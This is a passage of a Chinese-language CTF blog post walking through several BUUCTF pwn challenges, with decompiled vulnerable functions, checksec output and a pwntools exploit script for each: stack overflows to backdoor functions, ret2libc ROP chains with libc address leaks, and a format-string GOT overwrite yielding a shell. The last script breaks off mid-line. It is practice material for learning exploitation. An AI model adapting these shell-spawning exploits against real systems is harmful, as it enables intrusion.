class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);                              <span class="comment">// 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>cat flag</code>函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./warmup_csaw_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">64</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x0000000000400611</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>题目如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int func()</span><br><span class="line">&#123;</span><br><span class="line">  char v1[44]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  float v2; // [rsp+2Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 = 0.0;</span><br><span class="line">  puts(&quot;Let&#x27;s guess the number.&quot;);</span><br><span class="line">  gets(v1);</span><br><span class="line">  if ( v2 == 11.28125 )</span><br><span class="line">    return system(&quot;cat /flag&quot;);</span><br><span class="line">  else</span><br><span class="line">    return puts(&quot;Its value should be 11.28125&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出到v2, 使v2为<code>11.28125</code>即可</p><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_1&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;1&quot;</span> * <span class="number">44</span> + struct.pack(<span class="string">&quot;&lt;f&quot;</span>, <span class="number">11.28125</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>32位C++, 开启了<code>NX</code>， 但这题用不到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  pwn1_sctf_2016 checksec pwn1_sctf_2016</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="keyword">const</span> <span class="keyword">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br></pre></td></tr></table></figure><p>存在<code>get_flag</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 会将输入的<code>I</code>替换为<code>you</code>, 造成溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  pwn1_sctf_2016 ./pwn1_sctf_2016</span><br><span class="line">Tell me something about yourself: IIII</span><br><span class="line">So, youyouyouyou</span><br></pre></td></tr></table></figure><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn1_sctf_2016/pwn1_sctf_2016&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;I&quot;</span> * <span class="number">0x14</span> + <span class="string">b&quot;2&quot;</span> * <span class="number">4</span> + p32(<span class="number">0x8048F13</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><p>基础栈溢出, 直接溢出到 backdoor 就可以了</p><h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./level0)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">27700</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">128</span> + <span class="number">8</span>) + p64(<span class="number">0x000000000400596</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Hello, World\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>基础栈溢出, 没有后门函数但是有<code>system</code>函数, 且 IDA 搜索字符串有<code>/bin/sh</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0804A024 hint            db &#x27;/bin/sh&#x27;,0</span><br></pre></td></tr></table></figure><p>那么思路就是栈溢出到system, 且布局栈中有参数 <code>/bin/sh</code> 的地址就可以 getshell 了</p><h4 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./level2&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">25988</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * (<span class="number">136</span> + <span class="number">4</span>) + p32(<span class="number">0x8048320</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x804a024</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf 2017 babyheap"></a>0ctf 2017 babyheap</h3><p><a href="https://lantern.cool/wp-item-0ctf-2017-babyheap/">0ctf 2017 babyheap</a></p><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_c_1 checksec ciscn_2019_c_1</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>64位ELF, 开了NX, 一个加解密程序，encrypt可用</p><p>其中encrypt</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  _WORD v3[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Plaintext to be encrypted&quot;</span>);</span><br><span class="line">  gets(s);                                      <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciphertext&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目没有system和/bin/sh所以需要构造ROP, 并且没有给出libc文件，需要leak</p><p>根据64位传参规则，puts函数传入参数为<code>rdi</code>， 所以需要<code>pop rdi</code>的gadget</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_c_1 ROPgadget --binary ciscn_2019_c_1 |grep &quot;pop rdi&quot;</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>由于线上环境为ubuntu18，故调用system需要栈对齐<a href="http://blog.eonew.cn/archives/958">在一些64位的glibc的payload调用system函数失败问题 – Ex个人博客 (eonew.cn)</a></p><p>多加个ret使栈对齐即可</p><h4 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h4><p>本来输入时是需要先进行decrypt的，这样才能使encrypt后变为我们想要的数据，但根据<code>strlen</code>的截断为<code>\x00</code>以及地址<code>b9 06 40</code>不在加密范围内，故实际打的时候不需要</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_c_1/ciscn_2019_c_1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1/ciscn_2019_c_1&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;puts_plt =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_plt)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;puts_got =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_got)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;gets_got =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(gets_got)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;@&quot;</span>)</span><br><span class="line">rl()</span><br><span class="line"></span><br><span class="line">puts_leak = u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts_leak =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_leak)</span><br><span class="line">libc_base = puts_leak - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;libc_base =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;sys_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(sys_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;str_bin_sh_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(str_bin_sh_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;choice!\n&quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(str_bin_sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia() </span><br></pre></td></tr></table></figure><h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211020145931370.png" alt="image-20211020145931370"></p><p>存在格式化字符串漏洞，先通过<code>%p</code>查看我们输入的值位于哪里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Pwn ./\[第五空间2019\ 决赛\]PWN5/pwn</span><br><span class="line">your name:aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p    </span><br><span class="line">Hello,aaaa-0xffd74948-0x63-(nil)-0xf7fcaa9c-0x3-0xf7f9d410-0x1-(nil)-0x1-0x61616161-0x2d70252d</span><br></pre></td></tr></table></figure><p>可以看出，位于第10个参数</p><p>由于本题的限制较少，故我们有以下几种做法</p><ol><li>覆盖<code>dword_0804C044</code>的值</li><li>将<code>dword_0804C044</code>的值读出</li><li>覆盖<code>atoi</code>函数的地址为<code>system</code>， 传入<code>/bin/sh</code>获得<code>shell</code></li></ol><h4 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(data_addr) + <span class="string">b&quot;%10$n&quot;</span> <span class="comment"># 将0x0804C044处的值覆盖为已输出的字符串长度，即4</span></span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP2"><a href="#EXP2" class="headerlink" title="EXP2"></a>EXP2</h4><p>这里需要注意，输入的<code>atoi</code>函数传入有符号，最大只能<code>0x7fffffff</code>, 所以…概率成功</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(data_addr) + <span class="string">b&quot;%10$s&quot;</span></span><br><span class="line">sd(payload)</span><br><span class="line">ru(p32(data_addr))</span><br><span class="line">data = u32(rv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">f&quot;data =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line">sd(<span class="built_in">str</span>(data))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP3"><a href="#EXP3" class="headerlink" title="EXP3"></a>EXP3</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;atoi_got: system_plt&#125;)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p><code>checksec</code> 一下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  [OGeek2019]babyrop checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/[OGeek2019]babyrop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>首先要求输入等于一个随机数，但由于<code>strlen</code>是<code>\x00</code>截断，可以将v5设置为0过掉<code>strncmp</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">32u</span>);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);                             <span class="comment">// \x00截断</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着将我们的输入的<code>buf[7]</code>传入下面的函数接受读入, 存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);                    <span class="comment">// a1 &gt;= 231即栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">ip_port = <span class="string">&quot;node4.buuoj.cn:26681&quot;</span>.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">ip = ip_port[<span class="number">0</span>]</span><br><span class="line">port = ip_port[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0xe7</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">f&quot;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">lib.address = read_addr - lib.symbols[<span 